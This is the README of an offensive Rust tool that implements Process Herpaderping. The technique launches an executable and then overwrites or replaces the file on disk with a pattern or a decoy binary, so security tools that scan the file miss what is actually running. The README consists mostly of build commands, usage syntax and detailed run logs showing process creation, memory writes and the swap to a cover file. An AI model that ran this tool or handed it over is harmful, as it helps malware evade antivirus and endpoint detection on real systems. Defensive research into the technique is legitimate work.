# Rust Process Herpaderping
Rust implementation of the Process Herpaderping original PoC written by **@jxy-s**: https://github.com/jxy-s/herpaderping.

> **DISCLAIMER.** All information contained in this repository is provided for educational and research purposes only. The owner is not responsible for any illegal use of included code snippets.

## Build
```
PS C:\Users\secur30nly> cargo build --release

// OR

PS C:\Users\secur30nly> cargo build --release --features debug  // debug mod enabled
```

## Usage
### Help menu

```
PS C:\Users\secur30nly> .\rust-herpaderping.exe --help
Usage: rust-herpaderping.exe <SOURCE_FILENAME> <TARGET_FILENAME> [COVER_FILENAME]

Arguments:
  <SOURCE_FILENAME>
  <TARGET_FILENAME>
  [COVER_FILENAME]

Options:
  -h, --help     Print help
  -V, --version  Print version

```

### Process herpaderping without debug mode and replacing target file (filling with pattern)

```
PS C:\Users\secur30nly> .\rust-herpaderping-nodebug.exe "C:\Windows\System32\cmd.exe" "C:\temp\dummy_file.exe"
2023-06-06T10:18:03.033Z INFO  [rust_herpaderping] Source File: C:\Windows\System32\cmd.exe
2023-06-06T10:18:03.034Z INFO  [rust_herpaderping] Target File: C:\temp\dummy_file.exe
2023-06-06T10:18:03.034Z INFO  [rust_herpaderping] Target file created, handles to source file and target file retrieved
2023-06-06T10:18:03.037Z INFO  [rust_herpaderping] Source file written to target file
2023-06-06T10:18:03.038Z INFO  [rust_herpaderping] Target process created
2023-06-06T10:18:03.038Z INFO  [rust_herpaderping] Target file was replaced by pattern
2023-06-06T10:18:03.040Z INFO  [rust_herpaderping] Main thread in target process started. Waiting until the process is finished
2023-06-06T10:18:15.322Z INFO  [rust_herpaderping] Process herpaderping is over :D
```

### Process herpaderping with debug mode enabled

```
PS C:\Users\secur30nly> .\rust-herpaderping.exe "C:\Windows\System32\cmd.exe" "C:\temp\dummy_file.exe"
2023-06-06T10:19:30.079Z INFO  [rust_herpaderping] Source File: C:\Windows\System32\cmd.exe
2023-06-06T10:19:30.079Z INFO  [rust_herpaderping] Target File: C:\temp\dummy_file.exe
2023-06-06T10:19:30.079Z DEBUG [rust_herpaderping] Source file handle: 156
2023-06-06T10:19:30.079Z DEBUG [rust_herpaderping] Target file handle: 160
2023-06-06T10:19:30.079Z INFO  [rust_herpaderping] Target file created, handles to source file and target file retrieved
2023-06-06T10:19:30.079Z DEBUG [rust_herpaderping] Source file size: 289792
2023-06-06T10:19:30.079Z DEBUG [rust_herpaderping] Target file size before writing: 0
2023-06-06T10:19:30.079Z DEBUG [rust_herpaderping] Content buffer size after reading source file: 289792
2023-06-06T10:19:30.080Z DEBUG [rust_herpaderping::utils] Bytes written to target: 289792
2023-06-06T10:19:30.080Z INFO  [rust_herpaderping] Source file written to target file
2023-06-06T10:19:30.081Z DEBUG [rust_herpaderping] Section handler: 156
2023-06-06T10:19:30.081Z DEBUG [rust_herpaderping] Process handler: 164
2023-06-06T10:19:30.081Z INFO  [rust_herpaderping] Target process created
2023-06-06T10:19:30.081Z DEBUG [rust_herpaderping::utils] Mapping handle: 156
2023-06-06T10:19:30.081Z DEBUG [rust_herpaderping::utils] Mapped view address: 0x20ec9590000
2023-06-06T10:19:30.081Z DEBUG [rust_herpaderping::utils] File mapping size: 290816
2023-06-06T10:19:30.081Z DEBUG [rust_herpaderping::utils] RVA of image entry point: 0x18f50
2023-06-06T10:19:30.082Z DEBUG [rust_herpaderping::utils] Bytes written to target: 289792
2023-06-06T10:19:30.082Z INFO  [rust_herpaderping] Target file was replaced by pattern
2023-06-06T10:19:30.082Z DEBUG [rust_herpaderping] PEB base address: 0x307e451000
2023-06-06T10:19:30.082Z DEBUG [rust_herpaderping::utils] Parameters maximum length + size of environment: 6528
2023-06-06T10:19:30.082Z DEBUG [rust_herpaderping::utils] Allocated memory in remote process: 0x1bc62890000
2023-06-06T10:19:30.083Z DEBUG [rust_herpaderping::utils] Param env local address: 0x20ec93ce828
2023-06-06T10:19:30.083Z DEBUG [rust_herpaderping::utils] Param env remote address: 0x1bc62890708
2023-06-06T10:19:30.083Z DEBUG [rust_herpaderping::utils] Bytes of env written to remote address: 6528
2023-06-06T10:19:30.083Z DEBUG [rust_herpaderping::utils] Bytes written of param pointer to remote params: 8
2023-06-06T10:19:30.083Z DEBUG [rust_herpaderping] Remote entry point address: 0x7ff753258f50
2023-06-06T10:19:30.084Z DEBUG [rust_herpaderping] Started thread handle: 156
2023-06-06T10:19:30.085Z INFO  [rust_herpaderping] Main thread in target process started. Waiting until the process is finished
2023-06-06T10:19:44.693Z INFO  [rust_herpaderping] Process herpaderping is over :D
```

### Process herpaderping with replacing target file

```
PS C:\Users\secur30nly> .\rust-herpaderping-nodebug.exe "C:\Windows\System32\cmd.exe" "C:\temp\dummy_file.exe" "C:\Program Files\Process Hacker 2\ProcessHacker.exe"
2023-06-06T10:26:27.804Z INFO  [rust_herpaderping] Source File: C:\Windows\System32\cmd.exe
2023-06-06T10:26:27.804Z INFO  [rust_herpaderping] Target File: C:\temp\dummy_file.exe
2023-06-06T10:26:27.805Z INFO  [rust_herpaderping] Target file created, handles to source file and target file retrieved
2023-06-06T10:26:27.806Z INFO  [rust_herpaderping] Source file written to target file
2023-06-06T10:26:27.807Z INFO  [rust_herpaderping] Target process created
2023-06-06T10:26:27.811Z INFO  [rust_herpaderping] Target file was replaced by file: C:\Program Files\Process Hacker 2\ProcessHacker.exe
2023-06-06T10:26:27.812Z INFO  [rust_herpaderping] Main thread in target process started. Waiting until the process is finished
2023-06-06T10:26:46.666Z INFO  [rust_herpaderping] Process herpaderping is over :D
```
